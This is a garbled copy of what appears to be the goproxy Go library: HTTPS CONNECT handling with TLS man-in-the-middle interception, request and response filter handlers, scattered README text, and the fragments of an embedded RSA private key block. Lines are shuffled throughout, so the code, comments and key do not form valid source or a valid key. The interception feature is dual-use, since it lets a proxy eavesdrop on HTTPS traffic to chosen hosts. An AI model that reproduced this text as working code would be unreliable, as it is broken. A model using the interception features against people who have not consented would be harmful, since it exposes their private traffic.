"ctx.Logf(""Assuming CONNECT is plain HTTP tunneling, mitm proxying it"")"
var err error
"panic(""httpserver does not support hijacking"")"
dst.CloseWrite()
switch todo.Action {
"""os"""
"= "":80"""
"""sync/atomic"""
case ConnectHijack:
"proxyClient, _, e := hij.Hijack()"
// Read response.
"tls.Certificate) func(host string, ctx "
"ProxyCtx{Req: r, Session: atomic.AddInt64("
// Bug fix which goproxy fails to provide request
"// this goes in a separate goroutine, so that the net/http server won't think we're"
"resp = proxy.filterResponse(resp, ctx)"
"ctx.Logf(""Running %d CONNECT handlers"", len(proxy.httpsHandlers))"
return nil
if !ok {
if newtodo != nil {
"ctx.Logf(""resp %v"", resp.Status)"
"// Since we don't know the length of resp, return chunked encoded response"
case ConnectReject:
if proxy.ConnectDial == nil {
"func httpError(w io.WriteCloser, ctx "
"hij, ok := w.(http.Hijacker)"
func copyAndClose(ctx 
"proxy.sess, 1), proxy: proxy, UserData: ctx.UserData}"
req.URL.Path)
"ctx.Warnf(""Cannot write TLS chunked EOF from mitm'd client: %v"", err)"
chunked := newChunkedWriter(rawClientTls)
"ctx.Warnf(""Cannot read TLS request from mitm'd client %v %v"", r.Host, err)"
connectReqHandler(connectReq)
"Method: ""CONNECT"","
GoproxyCa)}
"""strconv"""
if todo.TLSConfig != nil {
"http.Request, client net.Conn, ctx "
ConnectReject
"ProxyHttpServer) dial(network, addr string) (c net.Conn, err error) {"
"""errors"""
tlsConfig := defaultTLSConfig
"// Okay to use and discard buffered reader here, because"
sync.WaitGroup) {
var cert 
// TLS server will not speak until spoken to.
"return c, nil"
 string(body))
"return func(host string, ctx "
"""strings"""
 clientOK {
client := bufio.NewReader(proxyClient)
httpsRegexp     = regexp.MustCompile(
"tls.Config, error) {"
"ctx.Warnf(""Cannot write TLS response header from mitm'd client: %v"", err)"
"url.URL{Opaque: addr},"
"ctx.Logf(""Exiting on EOF"")"
"Header: make(http.Header),"
"""net/url"""
ConnectHTTPMitm
"u, err := url.Parse(https_proxy)"
"ctx.Warnf(""Cannot read TLS response from mitm'd server %v"", err)"
if ctx.Resp != nil {
r.Host
"return func(network, addr string) (net.Conn, error) {"
"ctx.Logf(""Accepting CONNECT to %s"", host)"
net.TCPConn) {
if !httpsRegexp.MatchString(req.URL.String()) {
"ProxyHttpServer) func(network, addr string) (net.Conn, error) {"
"https_proxy := os.Getenv(""HTTPS_PROXY"")"
"if u.Scheme == ""https"" {"
"return proxy.ConnectDial(network, addr)"
ConnectAccept = iota
"""regexp"""
"ctx.Warnf(""Error dialing to %s: %s"", host, err.Error())"
"panic(""Cannot hijack connection "" "
if err := ctx.Resp.Write(proxyClient)
Action    ConnectActionLiteral
if err != nil 
connectReq := 
if err := resp.Header.Write(rawClientTls)
"tls.Certificate, error) {"
"ctx.Warnf(""Cannot handshake client %v %v"", r.Host, err)"
wg.Wait()
"proxyClientTCP, clientOK := proxyClient.("
ConnectMitm
"proxyClient.Write([]byte(""HTTP/1.0 200 OK"
package goproxy
for {
 err != nil {
ctx.Req = req
"if _, err := io.WriteString(w, ""HTTP/1.1 502 Bad Gateway"
func TLSConfigFromCA(ca 
http.Request{
"ctx.Logf(""on %dth handler: %v %s"", i, todo, host)"
if e != nil {
"go copyOrWarn(ctx, targetSiteCon, proxyClient, "
} else {
"req, err := http.ReadRequest(clientTlsReader)"
u.Host 
targetSiteCon.Close()
func copyOrWarn(ctx 
// TODO: Allow Server.Close() mechanism to shut down this connection as nicely as possible
"ProxyHttpServer) NewConnectDialToProxyWithHandler(https_proxy string, connectReqHandler func(req "
"req.URL, err = url.Parse(""https://"" "
"todo.Hijack(r, proxyClient, ctx)"
"resp.Header.Set(""Transfer-Encoding"", ""chunked"")"
"tlsConfig, err = todo.TLSConfig(host, ctx)"
"resp, err = ctx.RoundTrip(req)"
// TODO: use a more reasonable scheme
connectReq.Write(c)
break
if ctx.certStore != nil {
"ctx.Warnf(""Cannot sign host certificate with provided CA: %s"", err)"
proxyClient.Close()
hostname := stripPort(host)
if err != nil {
// information URL in the context when does HTTPS MITM
config := 
"""net/http"""
ConnectProxyAuthHijack
"ctx.Logf(""Hijacking CONNECT to %s"", host)"
HTTPMitmConnect = 
"resp, err = http.ReadResponse(remote, req)"
"v"", err)"
"ProxyCtx, dst, src "
return s[:ix]
import (
"return proxy.dial(network, addr)"
return s
"newtodo, newhost := h.HandleConnect(host, ctx)"
"https_proxy = os.Getenv(""https_proxy"")"
"if strings.IndexRune(u.Host, ':') == -1 {"
var wg sync.WaitGroup
"httpError(proxyClient, ctx, err)"
 err != io.EOF {
 req.URL.String())
"cert, err = ctx.certStore.Fetch(hostname, genCert)"
MitmConnect     = 
"ctx.Logf(""req %v"", r.Host)"
"config, nil"
func stripPort(s string) string {
"tls.Config, error)"
"= "":443"""
 e.Error())
"TLSConfig func(host string, ctx "
"req.RemoteAddr = r.RemoteAddr // since we're converting the request, need to carry over the original connecting IP as well"
"ConnectAction{Action: ConnectMitm, TLSConfig: TLSConfigFromCA("
"// If found a result, break the loop immediately"
"ProxyCtx{Req: req, Session: atomic.AddInt64("
"n""))"
"return proxy.NewConnectDialToProxyWithHandler(https_proxy, nil)"
"""net"""
var ctx = 
if proxy.Tr.Dial != nil {
"// request can take forever, and the server will be stuck when ""closed""."
statusCode
src.CloseRead()
cert)
"req, resp := proxy.filterRequest(req, ctx)"
remote := bufio.NewReader(targetSiteCon)
"if _, err := io.Copy(dst, src)"
defer resp.Body.Close()
"resp, err := ioutil.ReadAll(resp.Body)"
type ConnectAction struct {
"todo, host := OkConnect, r.URL.Host"
"todo, host = newtodo, newhost"
"body, err := ioutil.ReadAll(io.LimitReader(resp.Body, 500))"
net.TCPConn)
if !hasPort.MatchString(host) {
"targetSiteCon, err := proxy.connectDial(""tcp"", host)"
if err := req.Write(targetSiteCon)
statusCode := strconv.Itoa(resp.StatusCode) 
"resp, err := http.ReadResponse(br, connectReq)"
"return nil, errors.New(""proxy refused connection"" "
if resp == nil {
ctx := 
"ctx.Logf(""Assuming CONNECT is TLS, mitm proxying it"")"
// always use 1.1 to support chunked encoding
"ProxyHttpServer) NewConnectDialToProxy(https_proxy string) func(network, addr string) (net.Conn, error) {"
// still handling the request even after hijacking the connection. Those HTTP CONNECT
case ConnectAccept:
"ctx.Warnf(""cannot read request of MITM HTTP client: %"
host 
for !isEof(clientTlsReader) {
text
"ctx.Warnf(""Cannot write response that reject http CONNECT: %v"", err)"
"if https_proxy == """" {"
return 
"Host:   addr,"
if connectReqHandler != nil {
https:
"ctx.Logf(""signing for %s"", stripPort(host))"
RejectConnect   = 
if resp.StatusCode != 200 {
c.Close()
"return nil, err"
if targetOK 
case ConnectHTTPMitm:
"removeProxyHeaders(ctx, req)"
ProxyCtx) (
"ctx.Warnf(""Cannot write TLS response body from mitm'd client: %v"", err)"
"http.Request)) func(network, addr string) (net.Conn, error) {"
if err := w.Close()
"ProxyCtx, err error) {"
func dialerFromEnv(proxy 
" u.Scheme == ""http"" {"
 r.Host 
"ctx.Warnf(""Cannot write TLS response header end from mitm'd client: %v"", err)"
"ctx.Warnf(""Error copying to client: %s"", err)"
"ConnectAction{Action: ConnectAccept, TLSConfig: TLSConfigFromCA("
return proxy.NewConnectDialToProxy(https_proxy)
"c = tls.Client(c, proxy.Tr.TLSClientConfig)"
defaultTLSConfig
"resp.Header.Del(""Content-Length"")"
br := bufio.NewReader(c)
"ca, []string{hostname})"
URL:    
"ix := strings.IndexRune(s, ':')"
//TODO: cache connections to the remote website
ProxyCtx)
"if _, err := io.WriteString(rawClientTls, ""HTTP/1.1"""
"for i, h := range proxy.httpsHandlers {"
Hijack    func(req 
"targetTCP, targetOK := targetSiteCon.("
"go copyAndClose(ctx, targetTCP, proxyClientTCP)"
"ConnectAction{Action: ConnectHTTPMitm, TLSConfig: TLSConfigFromCA("
" "" """
"proxyClient.Write([]byte(""HTTP/1.1 407 Proxy Authentication Required"
"""io"""
"if strings.HasPrefix(text, statusCode) {"
wg.Done()
http.Request) {
"""bufio"""
"""sync"""
if ix == -1 {
defer rawClientTls.Close()
"ctx.Warnf(""Illegal URL %s"", ""https://"""
"ProxyCtx, dst io.Writer, src io.Reader, wg "
"cert, err = genCert()"
func (proxy 
"rawClientTls := tls.Server(proxyClient, tlsConfig)"
"go copyOrWarn(ctx, proxyClient, targetSiteCon, "
if err := resp.Write(proxyClient)
"if _, err = io.WriteString(rawClientTls, """
return
case ConnectMitm:
"return proxy.Tr.Dial(network, addr)"
if err := chunked.Close()
"resp.Header.Set(""Connection"", ""close"")"
 string(resp))
genCert := func() (
if err := rawClientTls.Handshake()
// Force connection close otherwise chrome will keep CONNECT tunnel open forever
"if _, err := io.Copy(chunked, resp.Body)"
tls.Certificate
"proxy.sess, 1), proxy: proxy, certStore: proxy.CertStore}"
"ctx.Warnf(""Cannot write TLS response chunked trailer from mitm'd client: %v"", err)"
"""crypto/tls"""
var (
"ctx.Warnf(""Error closing client connection: %s"", err)"
"return net.Dial(network, addr)"
return signHost(
"ctx.Warnf(""Error responding to client: %s"", err)"
"ProxyHttpServer) handleHttps(w http.ResponseWriter, r "
const (
"ConnectAction{Action: ConnectReject, TLSConfig: TLSConfigFromCA("
"import ""net/http"""
"http.Request, ctx "
"// That is, the proxy will create a TLS connection with the client, another TLS"
"HandleConnect(req string, ctx "
"return f(req, ctx)"
// The request and responses sent in this Man In the Middle channel are filtered
// and RespHandlers)
Handle(resp 
ProxyCtx) (
type RespHandler interface {
"ConnectAction, string) {"
"return f(host, ctx)"
// to the client.
"// to the destination server. If it returns nil,resp the proxy will"
"// FuncRespHandler.Handle(req,ctx) <=> FuncRespHandler(req,ctx)"
"// all the HttpsHandlers the proxy has, and if one returns true, the connection is"
// A wrapper that would convert a function to a HttpsHandler interface type
"// skip sending any requests, and will simply return the response "
"http.Response, ctx "
"http.Request, "
"type FuncHttpsHandler func(host string, ctx "
Handle(req 
type FuncReqHandler func(req 
"ConnectAction, string)"
http.Response
"// connection with the destination the client wished to connect to, and would"
http.Response)
func (f FuncRespHandler) Handle(resp 
type FuncRespHandler func(resp 
type HttpsHandler interface {
// The proxy server will send to the client the response returned by the RespHandler.
// FuncHttpsHandler should implement the RespHandler interface
"// after the proxy have sent the request to the destination server, it will"
resp
// A wrapper that would convert a function to a ReqHandler interface type
"// When a client send a CONNECT request to a host, the request is filtered through"
// sniffed using Man in the Middle attack.
// send back and forth all messages from the server to the client and vice versa.
"// In case of error, resp will be nil, and ctx.RoundTrip.Error will contain the error"
package goproxy
"// ""filter"" the response through the RespHandlers it has."
http.Response {
"// FuncReqHandler.Handle(req,ctx) <=> FuncReqHandler(req,ctx)"
"// ReqHandler will ""tamper"" with the request coming to the proxy server"
// through the usual flow (request and response filtered through the ReqHandlers
http.Response) {
"func (f FuncHttpsHandler) HandleConnect(host string, ctx "
"return f(resp, ctx)"
type ReqHandler interface {
"// If Handle returns req,nil the proxy will send the returned request"
func (f FuncReqHandler) Handle(req 
// A wrapper that would convert a function to a RespHandler interface type
ProxyCtx) 
"proxy.OnRequest(cond1,cond2).Do(handler)"
"http.Request, ctx "
// DoFunc is equivalent to proxy.OnRequest().Do(FuncReqHandler(f))
"// the request, only if all the given ReqCondition matched."
"ConnectAction, string) {"
// connection.
ProxyConds) DoFunc(f func(resp 
respCond []RespCondition
"return h.Handle(r, ctx)"
HandleReq(req 
"ProxyConds{proxy, make([]ReqCondition, 0), conds}"
 cond2.HandleResp(resp)
// and will replace the body of the original response with the resulting byte array.
"""io/ioutil"""
"func ContentTypeIs(typ string, types ...string) RespCondition {"
"ConnectAction{Action: ConnectHijack, Hijack: f}, host"
"return RejectConnect, host"
"if !cond.HandleResp(resp, ctx) {"
// Typical usage:
var localHostIpv4 = regexp.MustCompile(
type RespCondition interface {
// to one of the given strings.
type ReqProxyConds struct {
proxy.OnRequest().HandleConnect(goproxy.AlwaysReject) // rejects all CONNECT requests
c := sha1.New()
ProxyHttpServer) OnResponse(conds ...RespCondition) 
return FuncRespHandler(func(resp 
type ReqCondition interface {
return ok
"return strings.HasPrefix(req.URL.Path, prefix) "
// with or without the host prefix.
"// UrlIs returns a ReqCondition, testing whether or not the request URL is one of the given strings"
"// any host, and requests of the form 'GET foo'."
resp.Body.Close()
// ReqCondition.HandleReq will decide whether or not to use the ReqHandler on an HTTP request
"""bytes"""
"var AlwaysReject FuncHttpsHandler = func(host string, ctx "
"pcond.proxy.httpsHandlers = append(pcond.proxy.httpsHandlers,"
// ProxyConds is used to aggregate RespConditions for a ProxyHttpServer.
"// to a byte array in memory, would run the user supplied f function on the byte arra,"
req.URL.Path)
"// given request to the proxy, will test if cond1.HandleReq(req,ctx) "
"for _, re := range regexps {"
"return c(ctx.Req, ctx)"
func UrlIs(urls ...string) ReqConditionFunc {
// SrcIpIs returns a ReqCondition testing whether the source IP of the request is one of the given strings
"// HandleConnect is used when proxy receives an HTTP CONNECT request,"
ReqProxyConds) HandleConnect(h HttpsHandler) {
"http.Request, client net.Conn, ctx "
ProxyCtx) bool
var IsLocalHost ReqConditionFunc = func(req 
"// forwarding all bytes from the client to the remote host, ConnectReject will close the connection with the"
"""strings"""
"proxy.OnRequest(UrlIs(""example.com/foo""),UrlMatches(regexp.MustParse("
http.Response {
ProxyCtx) 
"b, err := ioutil.ReadAll(resp.Body)"
func UrlMatches(re 
"// for example, accepting CONNECT request if they contain a password in header"
"// AlwaysReject is a HttpsHandler that drops any CONNECT request, for example, this code will disallow"
req.URL.Host
// requests to url 'http://host/x'
ProxyCtx) bool {
strings.HasPrefix(req.URL.Scheme
"return c(resp, ctx)"
return req.URL.Host == host
ProxyCtx) []byte) RespHandler {
reqConds []ReqCondition
if re.MatchString(req.Host) {
"http.Request, "
"_, pathOk := urlSet[req.URL.Path]"
"return h.HandleConnect(host, ctx)"
"""regexp"""
req.URL.Path]
// it'll then use the HttpsHandler to determine what should it
ProxyConds {
// connections to hosts on any other port than 443
"proxy.OnRequest(goproxy.Not(goproxy.ReqHostMatches(regexp.MustCompile("":443$"")))."
func ReqHostMatches(regexps ...
// to be usable as RespCondition.
RespCondition
""") {"
"proxy.OnRequest(goproxy.ReqHostIs(""www.google.com"")).HandleConnect(goproxy.AlwaysMitm)"
package goproxy
// any of the given regular expressions.
// IsLocalHost checks whether the destination host is explicitly local host
// handle the request if all conditions on the HTTP request are met.
"// OnResponse is used when adding a response-filter to the HTTP proxy, usual pattern is"
"// before sending it to the proxy client. Note that resp might be nil, in case there was an"
HandleResp(resp 
re.MatchString(req.URL.Host
"for _, cond := range pcond.reqConds {"
pcond.HandleConnect(FuncHttpsHandler(f))
ProxyCtx)) {
func (c ReqConditionFunc) HandleReq(req 
"// (buggy, there can be IPv6 addresses it doesn't catch)"
// UrlMatches returns a ReqCondition testing whether the destination URL
ProxyHttpServer
 hostAndOk
// struct returned will determine what to do with this request. ConnectAccept will simply accept the request
'GET google.com/' to
"return r, nil"
"for _, cond := range pcond.respCond {"
func SrcIpIs(ips ...string) ReqCondition {
"proxy.OnRequest().Do(handler) // will call handler.Handle(req,ctx) on every request to the proxy"
"// ProxyConds.Do will register the RespHandler on the proxy, h.Handle(resp,ctx) will be called on every"
"return MitmConnect, host"
"proxy.OnResponse(cond1,cond2).Do(handler) // handler.Handle(resp,ctx) will be used"
return true
"if !cond.HandleReq(ctx.Req, ctx) {"
if err != nil {
"// UrlIs(""google.com/"",""foo"") will match requests 'GET /' to 'google.com', requests "
"""net/http"""
hostSet := make(map[string]bool)
// RespCondition.HandleReq will decide whether or not to use the RespHandler on an HTTP response
"// Upon calling ProxyConds.Do, it will register a RespHandler that would"
"// You will use the ReqProxyConds struct to register a ReqHandler, that would filter"
"// ReqHostIs returns a ReqCondition, testing whether the host to which the request is directed to equal"
"// do with this request. The handler returns a ConnectAction struct, the Action field in the ConnectAction"
"req.URL.Path, prefix) "
"if strings.HasPrefix(req.RemoteAddr, ip"
"resp.Body = ioutil.NopCloser(bytes.NewBuffer(f(b, ctx)))"
"for _, h := range hosts {"
"for _, ip := range ips {"
// in the Middle attack to eavesdrop the connection. All regular handler will be active on this eavesdropped
import (
"FuncHttpsHandler(func(host string, ctx "
ReqProxyConds {
"// ReqProxyConds aggregate ReqConditions for a ProxyHttpServer. Upon calling Do, it will register a ReqHandler that would"
"// ReqProxyConds.Do will register the ReqHandler on the proxy,"
HandleConnect(goproxy.AlwaysReject)
"// ReqConditionFunc.HandleReq(req,ctx) <=> ReqConditionFunc(req,ctx)"
"http.Response, ctx "
if c.Sum(nil) == passHash {
"for _, u := range urls {"
""":"") {"
" strings.HasPrefix(contentType, typ"
"contentType := resp.Header.Get(""Content-Type"")"
"// has the given prefix, with or without the host."
urlSet := make(map[string]bool)
// ContentTypeIs returns a RespCondition testing whether the HTTP response has Content-Type header equal
func Not(r ReqCondition) ReqConditionFunc {
"""net"""
// DstHostIs returns a ReqCondition testing wether the host in the request url is the given string
"// For example UrlHasPrefix(""host/x"") will match requests of the form 'GET host/x', and will match"
func UrlHasPrefix(prefix string) ReqConditionFunc {
strings.HasPrefix(req.URL.Host
// before sending it to the remote server
urlSet[u] = true
ReqProxyConds) DoFunc(f func(req 
ReqProxyConds) HijackConnect(f func(req 
hostSet[h] = true
"proxy.OnRequest().HandleConnectFunc(func(host string, ctx "
func DstHostIs(host string) ReqConditionFunc {
"types = append(types, typ)"
"pcond.proxy.respHandlers = append(pcond.proxy.respHandlers,"
func (pcond 
"ctx.Warnf(""Cannot read response %s"", err)"
return re.MatchString(req.URL.Path) 
"// ProxyHttpServer.OnRequest Will return a temporary ReqProxyConds struct, aggregating the given condtions."
if resp == nil {
return RespConditionFunc(func(resp 
"// RespConditionFunc.HandleResp(resp,ctx) <=> RespConditionFunc(resp,ctx)"
passHash := h.Sum(nil)
"for _, typ := range types {"
// aggregated in the ReqProxyConds are met. Typical usage:
"req.URL.Host == ""localhost"""
http.Response) {
"return OkConnect, host"
"_, ok := hostSet[req.URL.Host]"
"var AlwaysMitm FuncHttpsHandler = func(host string, ctx "
// will use the default tls configuration.
"// of the request matches the given regexp, with or without prefix"
// ProxyConds.DoFunc is equivalent to proxy.OnResponse().Do(FuncRespHandler(f))
return 
// if cond1.HandleResp(resp) 
// error sending the request.
// to one of the given strings
return func(req 
"io.WriteString(h,password)"
"return h.Handle(resp, ctx)"
func (c RespConditionFunc) HandleResp(resp 
type ProxyConds struct {
func ReqHostIs(hosts ...string) ReqConditionFunc {
"// HandleConnectFunc is equivalent to HandleConnect,"
"// ReqHostMatches returns a ReqCondition, testing whether the host to which the request was directed to matches"
ProxyCtx) (
"io.WriteString(c,ctx.Req.Header.Get(""X-GoProxy-Auth""))"
ProxyConds) Do(h RespHandler) {
// HandleBytes will return a RespHandler that read the entire body of the request
"// The ConnectAction struct contains possible tlsConfig that will be used for eavesdropping. If nil, the proxy"
"return !r.HandleReq(req, ctx)"
"req.URL.Path, prefix)"
"pcond.proxy.reqHandlers = append(pcond.proxy.reqHandlers,"
pcond.Do(FuncReqHandler(f))
return ReqConditionFunc(func(req 
type RespConditionFunc func(resp 
// ReqConditionFunc cannot test responses. It only satisfies RespCondition interface so that
"// if they are, will call handler.Handle(req,ctx)"
"if !cond.HandleReq(r, ctx) {"
// handle the HTTP response from remote server if all conditions on the HTTP response are met.
"ConnectAction, string)) {"
return pathOk 
"ReqProxyConds{proxy, conds}"
"req.URL.Host == ""0:0:0:0:0:0:0:1"" "
regexp.Regexp) ReqConditionFunc {
http.Response)) {
return false
if contentType == typ 
.exampl.
"func HandleBytes(f func(b []byte, ctx "
" cond2.HandleReq(req,ctx) are true"
proxy    
FuncReqHandler(func(r 
"ReqProxyConds) HandleConnectFunc(f func(host string, ctx "
FuncRespHandler(func(resp 
"// AlwaysMitm is a HttpsHandler that always eavesdrop https connections, for example to"
"// eavesdrop all https connections to www.google.com, we can use"
"// client, and ConnectMitm, will assume the underlying connection is an HTTPS connection, and will use Man"
func (proxy 
// Not returns a ReqCondition negating the given ReqCondition
"return nil, """""
type ReqConditionFunc func(req 
ReqProxyConds) Do(h ReqHandler) {
"_, hostAndOk := urlSet[req.URL.Host"
"return req.URL.Host == ""::1"" "
// the ReqHandler will handle the HTTP request if all the conditions
func (c ReqConditionFunc) HandleResp(resp 
// UrlHasPrefix returns a ReqCondition checking wether the destination URL the proxy client has requested
localHostIpv4.MatchString(req.URL.Host) 
ProxyHttpServer) OnRequest(conds ...ReqCondition) 
pcond.Do(FuncRespHandler(f))
// request that matches the conditions aggregated in pcond.
"return c(req, ctx)"
return resp
)).Do(...)
ue4erZKmFP1u8wTNHQ03T6sECZbnIfEywRD/esHpclfF3kYAKDRqIP4K905Rb0iH
L0TsUDvMkuUZlV3hTPpQxsnZszH3iK64RB5p3jBCcs
geFYo0q
2iLNyeTKIepSNlsBxnkLmqM1
prw4rdYAEcmnLjNSudQGIy48hPMP8W4PHgLkjDCULryAcBluU2qkFkJfScUK
HRo3SfPXdPhSQ2thNTxl6y9XcFacuvbthgr70KXbvC4k6IEmdpf/0Kgs9
4PDOGM2xrjOuACSGMq8Zcu7LBz35PpIZtviJOeKNwUd8/xHjWC6W0itgfJb5I1Nm
AQKCAgAwSuNvxHHqUUJ3XoxkiXy1u1EtX9x1eeYnvvs2xMb
kPO2/ZSXHAcpQvcnpi2e8y2PNmy/uQ0VPATVt6NuWweqxncR5W5j82U/uDlXY8y3
gKu7DT59MXJEGVRCHT4Um
06/e9h7RsRyWPMdu3qRDPUYFaVDy6
-----BEGIN RSA PRIVATE KEY-----
jZJSnDN1o2PXymDrJulE61yguhc/QSmLccEPZe7or06/DmEhhKuCbv
Zd8yZ3Y8LXfjkykiIrSG1Z2jdt
759ZWt2iCbqZznf50XTvptdmjm5KxvouJzScnQ52gIV6L
JotWzx2op8uq7o
9jR9DPh0S5rCIdvCvcNaN0WPNF91FPN0vLWQW1bFi
dpUDSQ0
1MswKDeag
m31XpZOsfJMS9PjD6UU5U3ZsD/oMAjGuMGIXoOGgmqeFrRJm0N
glMMjKAJoo7SXIiVyC/LHc95urOi
E2Ot6AHtVyvjeUTIL651mFIo/7
4137Th6eMbdha2
ZVsVWlv7khUrCwAXz7Y8K7mKKBd2ekF5hSbryfJsxFyvEaWUPhnJpTKV85lAS
pmcjjocD/UCCSuHgbAYNNnO/JdhnSylz1tIg26I
/5gd9CNuFP3nUhW6tbY0mBHIETrZ
yq2oOLwz1FAYoQ3NT0gU6cJXtIB6Hjmxwy4jfDPzCuMFwfvOq4eS
6JQXIDM/H
5CdJAYDuDwxDXXBAhy7iFJEgYSDH00
4G/f/9BK3BJPdcOZSz7K6Ty8AMMBf8AehKTcSBqwkJWcbEvpHpKJ6
7QTZCG26HDrEZ2q9yMRlRaL2SRD
QbNlKIVt
0j3dzRMUpAkemC/p94tGES9f9iWUVi7gnfmUz1lxhjiqUoW5K1xfwmbx
/1JdFPGhL2
JvofBkcnpFrVvUUrQKCAQAaTIufETmgCo0BfuJB
N/JOSGIl0NnNryWwXe2gVgVltbsmt6FdL0uKFiEtWJUbOF5g1Q5Kcvs3O/XhBQGa
GbGazOm5ALWqUyhrnbLGc4CQMPfe7Il6NxwcrOxT8w=
0qNg5wjZKjkdtDY4LxAX7MZW524dRKiTiFLLYEF9nWl
3L9dDlZPcSocbjw295WMvHz2QjhrDrb8gXwdpoRyuyofqgCyNxSnEC5M13SjOxtf
cj/azKBaT04IOMLaN8xfSqitJYSraWMVNgGJM5vfcVaivZnNh0lZBv
0uuUdh21P20JMKt34ok0wn6On2ECN0i7UGv
9hwDLbM/AoBfVBDlP/tpAwa7AIIU1ZRDNbZr7emFdctx9B6kLINv3
QBbJUA/2/yLv8YYpaAaqj4aLwV8hRpkCggEBAIh3e25tr3avCdGgtCxS7Y1blQ2c
1FNe
FQuIp9TvKYlRQwKCAQEAwWJN8jysapdhi67jO0HtYOEl9wwnF4w6XtiOYtllkMmC
V6Vj368pGlJx6Se26lvXwyyrc9pSw6jSAwARBeU4YkNWpi4i6QKCAQEA0T7u3P/9
SJ9TgXj7hksxH1R6OLQaSQ8qxh3I
eDqn1B6brXTNKMT6fEEXCuZJGPBpNidyLv/xXDcN7kCOo3nGYKfB5OhFpNiL63tw
OSUCEc
C440b62qZSPMjVoquaMg
WJURQTYz2NEGUdkR
Ood3Qa13gZ
4/avCJ8IutT
MIIJKAIBAAKCAgEAnhDL4fqGGhjWzRBFy8iHGuNIdo79FtoWPevCpyek6AWrTuBF
C8v4f469Fb6bCUpyCQN9rffHQSGLH6wVb7
qmC2YAw
sjhTHtoHuu
Tmn/MUsraWagdk1sCluns0hXxBizT27KgGhDlaVRz05yfv
QrCKIPelLBEIqCJREh
lVbfak4s5XRri0tikHvlP06dNgZ0OPok5qi7d
g/EIMgcNSoxjvph1EShmKt
X61tCJrMNQOh4ycy/DEyBu1EWod
KR2oYfev2BDtHXoSZFfhFGHlOdLvWRh90D4qZf4vQ
aZrAnWrmHknNcqFAKsTqfdi2/fFqwoBwCtiEG91WreU6AfEWIiJuTZIru
pjGzjTqh0kDlKXg2/eTkd9xIHjVhFYiHIEeITM/lHCfWwBCYxViuuF7pSRPzTe8U
cQGFj6yn0Wd/07er49RqMXidQf
XmEQvIewk2oCI
FcMM
-----END RSA PRIVATE KEY-----
zCWTkNmSUKMGG/1CGFxI41Lb12xuq
/vtenAYbcSED
tAv7hm97
LntU56WESZwEqr8Pf80uFvsyXQK3a5q5HhIQtxl6tqQuPlNjsDBvCqj0x72mmaJ
6lWKCpqV
JaCrxfTd9oMoCN5b
qiGGJisOu5grvMl0RJAvjgvDMw
AmhawnO1gPDnjc3NLLlb79yrhdFiC2rVvRFbC5SKzB7OYyh7IdnwFAl7bEyMA6WU
540yY7
iDK8/WXiqZug8iYxi1qgW5iYxiV5uAL0s3XRsv3Urj6Mu3QjVie0TOuq
qu6YkdM88
sIibAoIBAAqIwlo5t
t3sMjZsIe8P3i
pRJhnPTf
qx0n9fKSo6n1FIKHypv3Kue2G0WhDeK6u0U288vQ1t4
3S85W
sZO8
/OKoF561YnAW9qkYHjic
d49zCATpmx5RFViMZwEcouXxRvvc9pPHXLP3ZPBD8nYu9kTD220mEGgWcZ
yeqPSnQ
7Y2xra7gB
o7Es0jLt75MZGJY6iasBYzXxVJH0tlsHGkkrs8tLNapglhNEJkcCAwEA
4DTN15PF
68JO
YJryAbVKBYIGWl
PySphPKn0anXPpexmRqGYfqpCDo7rPzgmNutWac80B4/CfHb8iUPg6Z1u
KukF
yKvcZHgW2Wn00znNJcCitufLGyAnMofudND/c5rx2qfBx7zZS7sKUQ/uRYjes6EZ
yet customizable and programmable.
))).HandleConnect(goproxy.RejectConnect)
"In order to use goproxy, one should set their browser to use goproxy as an HTTP"
 A taste of goproxy
"return a precanned text response saying ""do not waste your time""."
":443$""))).HandleConnect(goproxy.RejectConnect)"
"// handler called after proxy receives HTTP Response from destination host, and before proxy forward "
"If this prevents someone from using the software, do let me know and I'll consider changing it."
"            return r,goproxy.NewResponse(r,"
"                    ""Don't waste your time!"")"
The proxy itself is simply a 
DoFunc
gif$
    })
proxy.OnRequest(Some ReqConditions).HandleConnect(YourHandlerFunc())
"not Fiddler, is gathering statistics on page load times for a certain website over a week."
"    ""log"""
reqHandlers     []ReqHandler 
Get the latest goproxy from 
", that is a function receiving a "
.reddit.com during HTTP CONNECT phase
 handler.
 Why not Fiddler2
intended to be used as a real proxy.
"    ""github.com/elazarl/goproxy"""
"                    goproxy.ContentTypeText,http.StatusForbidden,"
Request
"        r.Header.Set(""X-GoProxy"",""yxorPoG-X"")"
"proxy.OnRequest(goproxy.ReqHostMatches(regexp.MustCompile(""reddit."
1. Ability to 
"http.Request,ctx "
I put the software temporarily under the Go-compatible BSD license.
"        if h,_,_ := time.Now().Clock()"
proxy.OnRequest(Some ReqConditions).Do(YourReqHandlerFunc())
"For example, the URL you should use as proxy when running "
// handler called before proxy send HTTP request to destination host
"Note that we returned nil value as the response. Had we returned a response, goproxy would"
"The intent of the proxy is to be usable with reasonable amount of traffic,"
"It supports regular HTTP proxy, HTTPS through CONNECT, and ""hijacking"" HTTPS"
 Mailing List
proxy.OnResponse(Some RespConditions).Do(YourRespHandlerFunc())
In order to refuse connections to reddit at work time
localhost:8080
and [in Firefox](http://www.wikihow.com/Enter-Proxy-Settings-in-Firefox).
proxy. Here is how you do that [in Chrome](https://support.google.com/chrome/answer/96815
./bin/basic
 returns a 
"There are 3 kinds of useful handlers to manipulate the behavior, as follows:"
 CONNECT requests. See
"        return r,nil"
"    ""net/http"""
 will process all incoming requests to the proxy. It will add a header to the request
"proxy.OnRequest(goproxy.DstHostIs(""www.reddit.com"")).DoFunc("
!forum/goproxy-dev)
To get a taste of 
 Latest Stable Release
This line will add 
and return it. The proxy will send the modified request.
 header to all requests sent through the proxy
// the Response to the client.
net/http
", as this is the default binding for the basic proxy."
goproxy server. Fiddler is a GUI app not designed to be run like a server for multiple users.
 h >= 8 
See additional examples in the examples directory.
// quiet common these days.
"// handler called after receiving HTTP CONNECT from the client, and before proxy establish connection "
I've received positive feedback from a few people who use goproxy in production settings.
hl=en)
func main() {
"Depending on what you want to manipulate, the ways to add handlers to each handler list are:"
utm_campaign=pr-badge
"    log.Fatal(http.ListenAndServe("":8080"", proxy))"
 will return
// The correct way to manipulate the HTTP request using URL.Path as condition is:
have discarded the request and sent the new response to the client.
proxy.OnRequest().DoFunc(
// Add handlers to reqHandlers
import (
For example:
"Fiddler is an excellent software with similar intent. However, Fiddler is not"
L27)
I'll change the import path.
// This rejects the HTTPS request to 
    func(r 
"DstHostIs(""www.reddit.com"")"
I believe it is good enough for usage.
goproxy.ProxyCtx)(
// Add handlers to respHandlers
ReqCondition
DstHostIs
))).Do(YourReqHandlerFunc())
" accepting only requests directed to ""www.reddit.com""."
